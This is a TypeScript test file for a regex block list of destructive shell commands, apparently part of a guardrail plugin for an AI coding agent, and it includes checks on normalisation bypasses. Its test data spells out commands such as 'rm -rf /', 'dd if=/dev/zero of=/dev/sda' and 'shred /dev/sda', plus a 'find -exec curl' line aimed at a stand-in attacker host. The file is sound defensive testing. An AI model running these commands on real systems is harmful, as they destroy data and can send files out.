/**
 * Structural + Behavioral tests for DESTRUCTIVE_PATTERNS in sdd-pipeline.ts
 *
 * FEV-7 (Issue #30):
 * - Structural: Ensures array contains ≥50 entries across 14+ categories
 * - Behavioral: Verifies patterns block destructive commands and allow safe ones
 * - Normalization: Ensures normalizeBash defeats common bypasses (comments, whitespace)
 */

import { describe, expect, test } from "bun:test";
import * as fs from "node:fs";
import * as path from "node:path";

const PLUGIN_PATH = path.resolve(
	import.meta.dir,
	"../../..",
	"template/obligatorio/.opencode/plugins/sdd-pipeline.ts",
);

/** Source of truth: DESTRUCTIVE_PATTERNS is now imported from ./src/destructivePatterns */
const DESTRUCTIVE_PATH = path.resolve(
	import.meta.dir,
	"../../..",
	"template/obligatorio/.opencode/plugins/src/destructivePatterns.ts",
);

// ─── Structural helpers ───────────────────────────────────────────────────

/**
 * Count entries in the DESTRUCTIVE_PATTERNS array by identifying
 * lines that start with regex patterns (/.../i,) within the array block.
 */
function countDestructivePatterns(fileContent: string): number {
	const lines = fileContent.split("\n");
	let inArray = false;
	let count = 0;

	for (const line of lines) {
		const trimmed = line.trim();

		if (trimmed.includes("DESTRUCTIVE_PATTERNS") && trimmed.includes("RegExp[]")) {
			inArray = true;
			continue;
		}

		if (inArray && trimmed === "]") {
			break;
		}

		if (inArray && trimmed.startsWith("/") && /\/[a-z]*\s*,/.test(trimmed)) {
			count++;
		}
	}

	return count;
}

/**
 * Extract category headers from the DESTRUCTIVE_PATTERNS array.
 */
function countCategoryHeaders(fileContent: string): number {
	const lines = fileContent.split("\n");
	let inArray = false;
	let count = 0;

	for (const line of lines) {
		const trimmed = line.trim();

		if (trimmed.includes("DESTRUCTIVE_PATTERNS") && trimmed.includes("RegExp[]")) {
			inArray = true;
			continue;
		}

		if (inArray && trimmed === "]") {
			break;
		}

		if (inArray && /^\/\/\s*───/.test(trimmed)) {
			count++;
		}
	}

	return count;
}

// ─── Behavioral helpers ───────────────────────────────────────────────────

/** Replicates normalizeBash from sdd-pipeline.ts for behavioral testing. */
const normalizeBash = (cmd: string): string =>
	cmd
		.replace(/#.*/g, "") // strip comments
		.replace(/\n/g, "") // strip newlines
		.replace(/\s+/g, " ") // collapse whitespace
		.trim();

/** Representative subset of destructive patterns for behavioral testing. */
interface PatternEntry {
	name: string;
	regex: RegExp;
}

const PATTERNS: PatternEntry[] = [
	{ name: "rm -rf", regex: /rm\s+-[a-z]*r[a-z]*f\b/i },
	{ name: "rm -fr", regex: /rm\s+-[a-z]*f[a-z]*r\b/i },
	{ name: "shred", regex: /shred\s+/i },
	{ name: "find -exec *", regex: /find\s+.*-exec(dir)?\b/i },
	{ name: "find -delete", regex: /find\s+.*-delete\b/i },
	{ name: "git push --force", regex: /git\s+push\s+(-f|--force)\b/i },
	{ name: "git reset --hard", regex: /git\s+reset\s+--hard\b/i },
	{ name: "git clean -fd", regex: /git\s+clean\s+-fd\b/i },
	{ name: "DROP TABLE", regex: /drop\s+table\b/i },
	{ name: "DROP DATABASE", regex: /drop\s+database\b/i },
	{ name: "TRUNCATE", regex: /truncate\s+(table\s+)?\w+/i },
	{ name: "DELETE FROM no WHERE", regex: /delete\s+from\s+\w+\s*;?\s*$/i },
	{ name: "docker rm -f", regex: /docker\s+(rm|rmi|container\s+rm|image\s+rm)\s+.*-f/i },
	{ name: "docker system prune -a", regex: /docker\s+system\s+prune\s+.*-a/i },
	{ name: "kubectl delete --all", regex: /kubectl\s+delete\s+.*--all\b/i },
	{ name: "chmod 777 root", regex: /chmod\s+(-R\s+)?0*777\b/i },
	{ name: "chown -R", regex: /chown\s+-R\b/i },
	{ name: "kill -9 1", regex: /kill\s+-(9|SIGKILL)\s+1\b/i },
	{ name: "shutdown", regex: /shutdown\s+(-h|-r|now)\b/i },
	{ name: "iptables -F", regex: /iptables\s+-F\b/i },
	{ name: "npm publish", regex: /npm\s+publish\b/i },
	{ name: "unset PATH", regex: /unset\s+PATH\b/i },
	{ name: "export PATH (total)", regex: /export\s+PATH\s*=\s*[^$]/i },
	{ name: "mkfs", regex: /mkfs\b/i },
	{ name: "dd if=", regex: /dd\s+if=/i },
	{ name: "terraform destroy", regex: /terraform\s+destroy\s+.*-auto-approve\b/i },
	{ name: "aws s3 rm --recursive", regex: /aws\s+s3\s+rm\s+.*--recursive\b/i },
	{ name: "redis FLUSHALL", regex: /redis-cli\s+.*(FLUSHALL|FLUSHDB)\b/i },
	{ name: "psql -c drop", regex: /psql\s+.*-c\s+.*(?:drop|alter\s+system|truncate)/i },
];

interface TestCase {
	name: string;
	cmd: string;
	patternName: string;
	expected: boolean; // true = blocked, false = allowed
}

/** Positive (should block) + Negative (should allow) test cases. */
const TEST_CASES: TestCase[] = [
	// ── Positive: destructive commands that MUST be blocked ──
	{ name: "rm -rf /", cmd: "rm -rf /", patternName: "rm -rf", expected: true },
	{ name: "rm -fr /", cmd: "rm -fr /", patternName: "rm -fr", expected: true },
	{
		name: "rm -rf --no-preserve-root /",
		cmd: "rm -rf --no-preserve-root /",
		patternName: "rm -rf",
		expected: true,
	},
	{ name: "shred /dev/sda", cmd: "shred /dev/sda", patternName: "shred", expected: true },
	{
		name: "find . -exec rm {} \\;",
		cmd: "find . -exec rm {} ;",
		patternName: "find -exec *",
		expected: true,
	},
	{
		name: "find . -exec curl attacker.com",
		cmd: "find . -exec curl http://attacker.com {} ;",
		patternName: "find -exec *",
		expected: true,
	},
	{
		name: "find . -execdir rm",
		cmd: "find . -execdir rm {} ;",
		patternName: "find -exec *",
		expected: true,
	},
	{
		name: "find . -execdir curl",
		cmd: "find . -execdir curl http://attacker.com {} ;",
		patternName: "find -exec *",
		expected: true,
	},
	{ name: "find . -delete", cmd: "find . -delete", patternName: "find -delete", expected: true },
	{
		name: "git push --force origin main",
		cmd: "git push --force origin main",
		patternName: "git push --force",
		expected: true,
	},
	{ name: "git push -f", cmd: "git push -f", patternName: "git push --force", expected: true },
	{
		name: "git reset --hard HEAD~1",
		cmd: "git reset --hard HEAD~1",
		patternName: "git reset --hard",
		expected: true,
	},
	{ name: "git clean -fd", cmd: "git clean -fd", patternName: "git clean -fd", expected: true },
	{ name: "DROP TABLE users", cmd: "DROP TABLE users", patternName: "DROP TABLE", expected: true },
	{
		name: "DROP DATABASE prod",
		cmd: "DROP DATABASE prod",
		patternName: "DROP DATABASE",
		expected: true,
	},
	{
		name: "TRUNCATE TABLE orders",
		cmd: "TRUNCATE TABLE orders",
		patternName: "TRUNCATE",
		expected: true,
	},
	{
		name: "DELETE FROM users",
		cmd: "DELETE FROM users",
		patternName: "DELETE FROM no WHERE",
		expected: true,
	},
	{
		name: "docker rm -f container1",
		cmd: "docker rm -f container1",
		patternName: "docker rm -f",
		expected: true,
	},
	{
		name: "docker system prune -a -f",
		cmd: "docker system prune -a -f",
		patternName: "docker system prune -a",
		expected: true,
	},
	{
		name: "kubectl delete pods --all",
		cmd: "kubectl delete pods --all",
		patternName: "kubectl delete --all",
		expected: true,
	},
	{
		name: "chmod 777 /etc/passwd",
		cmd: "chmod 777 /etc/passwd",
		patternName: "chmod 777 root",
		expected: true,
	},
	{ name: "chmod -R 777 /", cmd: "chmod -R 777 /", patternName: "chmod 777 root", expected: true },
	{
		name: "chmod 0777 /etc/passwd (leading zero)",
		cmd: "chmod 0777 /etc/passwd",
		patternName: "chmod 777 root",
		expected: true,
	},
	{
		name: "chmod -R 0777 / (leading zero with -R)",
		cmd: "chmod -R 0777 /",
		patternName: "chmod 777 root",
		expected: true,
	},
	{
		name: "chown -R $(whoami) /usr",
		cmd: "chown -R $(whoami) /usr",
		patternName: "chown -R",
		expected: true,
	},
	{ name: "kill -9 1", cmd: "kill -9 1", patternName: "kill -9 1", expected: true },
	{ name: "shutdown -h now", cmd: "shutdown -h now", patternName: "shutdown", expected: true },
	{ name: "reboot", cmd: "reboot", patternName: "shutdown", expected: false },
	{ name: "iptables -F", cmd: "iptables -F", patternName: "iptables -F", expected: true },
	{ name: "npm publish", cmd: "npm publish", patternName: "npm publish", expected: true },
	{ name: "unset PATH", cmd: "unset PATH", patternName: "unset PATH", expected: true },
	{
		name: "export PATH=/bad/path",
		cmd: "export PATH=/bad/path",
		patternName: "export PATH (total)",
		expected: true,
	},
	{ name: "mkfs.ext4 /dev/sdb1", cmd: "mkfs.ext4 /dev/sdb1", patternName: "mkfs", expected: true },
	{
		name: "dd if=/dev/zero of=/dev/sda",
		cmd: "dd if=/dev/zero of=/dev/sda",
		patternName: "dd if=",
		expected: true,
	},
	{
		name: "terraform destroy -auto-approve",
		cmd: "terraform destroy -auto-approve",
		patternName: "terraform destroy",
		expected: true,
	},
	{
		name: "aws s3 rm --recursive s3://bucket",
		cmd: "aws s3 rm --recursive s3://bucket",
		patternName: "aws s3 rm --recursive",
		expected: true,
	},
	{
		name: "redis-cli FLUSHALL",
		cmd: "redis-cli FLUSHALL",
		patternName: "redis FLUSHALL",
		expected: true,
	},
	{
		name: "redis-cli FLUSHDB",
		cmd: "redis-cli FLUSHDB",
		patternName: "redis FLUSHALL",
		expected: true,
	},
	{
		name: "psql -c 'DROP TABLE users'",
		cmd: "psql -c 'DROP TABLE users'",
		patternName: "psql -c drop",
		expected: true,
	},

	// ── Negative: safe commands that MUST be allowed ──
	{ name: "rm file.txt (no -rf)", cmd: "rm file.txt", patternName: "rm -rf", expected: false },
	{
		name: "git push origin main",
		cmd: "git push origin main",
		patternName: "git push --force",
		expected: false,
	},
	{
		name: "git reset (soft)",
		cmd: "git reset HEAD~1",
		patternName: "git reset --hard",
		expected: false,
	},
	{
		name: "SELECT * FROM users",
		cmd: "SELECT * FROM users",
		patternName: "DROP TABLE",
		expected: false,
	},
	{
		name: "DELETE FROM users WHERE id=1",
		cmd: "DELETE FROM users WHERE id=1",
		patternName: "DELETE FROM no WHERE",
		expected: false,
	},
	{ name: "npm install", cmd: "npm install", patternName: "npm publish", expected: false },
	{
		name: "chmod 644 file.txt",
		cmd: "chmod 644 file.txt",
		patternName: "chmod 777 root",
		expected: false,
	},
	{
		name: "kill -9 1234 (different PID)",
		cmd: "kill -9 1234",
		patternName: "kill -9 1",
		expected: false,
	},
	{ name: "git stash push", cmd: "git stash push", patternName: "shutdown", expected: false },
	{
		name: "export PATH=$PATH:/usr/local/bin (appends)",
		cmd: "export PATH=$PATH:/usr/local/bin",
		patternName: "export PATH (total)",
		expected: false,
	},
	{
		name: "export PATH=$HOME/bin:$PATH (prepends)",
		cmd: "export PATH=$HOME/bin:$PATH",
		patternName: "export PATH (total)",
		expected: false,
	},
	{
		name: "chmod -R 777 ./local (local dir — now blocked by broader regex)",
		cmd: "chmod -R 777 ./local",
		patternName: "chmod 777 root",
		expected: true,
	},
	{
		name: "chmod 777 relative/path (now blocked by broader regex)",
		cmd: "chmod 777 relative/path",
		patternName: "chmod 777 root",
		expected: true,
	},
];

/** Bypass attempts that normalization should defeat.
 *
 * normalizeBash strips comments, newlines, and collapses whitespace — but does NOT
 * merge separate flags (`-r -f` → `-rf`). Bypass tests must target what normalizeBash
 * actually normalizes: comments, multi-line commands, and extra whitespace around
 * the flag group.
 */
const BYPASS_CASES: { name: string; cmd: string; patternName: string }[] = [
	{ name: "double spaces around flag group", cmd: "rm  -rf  /", patternName: "rm -rf" },
	{ name: "comment after command", cmd: "rm -rf / # force delete", patternName: "rm -rf" },
	{ name: "newline before destructive", cmd: "\nrm -rf /", patternName: "rm -rf" },
	{ name: "inline comment after flags", cmd: "rm -rf /* clean up", patternName: "rm -rf" },
];

/** normalizeBash edge cases. */
const NORMALIZE_CASES: { name: string; input: string; expected: string }[] = [
	{ name: "strips comments", input: "rm -rf / # force delete", expected: "rm -rf /" },
	{ name: "collapses double spaces", input: "rm  -r  -f  /", expected: "rm -r -f /" },
	{ name: "strips newlines", input: "rm -rf /\n# dangerous", expected: "rm -rf /" },
	{ name: "trims leading/trailing whitespace", input: "  rm -rf /  ", expected: "rm -rf /" },
	{ name: "empty string", input: "", expected: "" },
	{ name: "only comment", input: "# just a comment", expected: "" },
	{ name: "collapses multiple spaces with tabs", input: "rm\t-rf\t/", expected: "rm -rf /" },
];

// ─── Tests ────────────────────────────────────────────────────────────────

describe("DESTRUCTIVE_PATTERNS", () => {
	let fileContent: string;

	test("plugin file exists", () => {
		expect(fs.existsSync(PLUGIN_PATH)).toBe(true);
	});

	test("contains ≥50 destructive command patterns", () => {
		fileContent = fs.readFileSync(DESTRUCTIVE_PATH, "utf-8");
		const count = countDestructivePatterns(fileContent);
		expect(count).toBeGreaterThanOrEqual(50);
	});

	test("patterns are organized in 14+ category blocks", () => {
		if (!fileContent) fileContent = fs.readFileSync(DESTRUCTIVE_PATH, "utf-8");
		const categories = countCategoryHeaders(fileContent);
		expect(categories).toBeGreaterThanOrEqual(14);
	});
});

describe("normalizeBash", () => {
	for (const { name, input, expected } of NORMALIZE_CASES) {
		test(name, () => {
			expect(normalizeBash(input)).toBe(expected);
		});
	}
});

describe("DESTRUCTIVE_PATTERNS behavioral", () => {
	describe("blocks destructive commands", () => {
		for (const { name, cmd, patternName } of TEST_CASES.filter((c) => c.expected)) {
			test(`${name}: "${cmd}"`, () => {
				const entry = PATTERNS.find((p) => p.name === patternName);
				expect(entry).toBeDefined();
				const normalized = normalizeBash(cmd);
				expect(entry!.regex.test(normalized)).toBe(true);
			});
		}
	});

	describe("allows safe commands", () => {
		for (const { name, cmd, patternName } of TEST_CASES.filter((c) => !c.expected)) {
			test(`${name}: "${cmd}"`, () => {
				const entry = PATTERNS.find((p) => p.name === patternName);
				expect(entry).toBeDefined();
				const normalized = normalizeBash(cmd);
				expect(entry!.regex.test(normalized)).toBe(false);
			});
		}
	});

	describe("defeats common bypass attempts", () => {
		for (const { name, cmd, patternName } of BYPASS_CASES) {
			test(`${name}: "${cmd}"`, () => {
				const normalized = normalizeBash(cmd);
				const entry = PATTERNS.find((p) => p.name === patternName);
				expect(entry).toBeDefined();
				expect(entry!.regex.test(normalized)).toBe(true);
			});
		}
	});
});
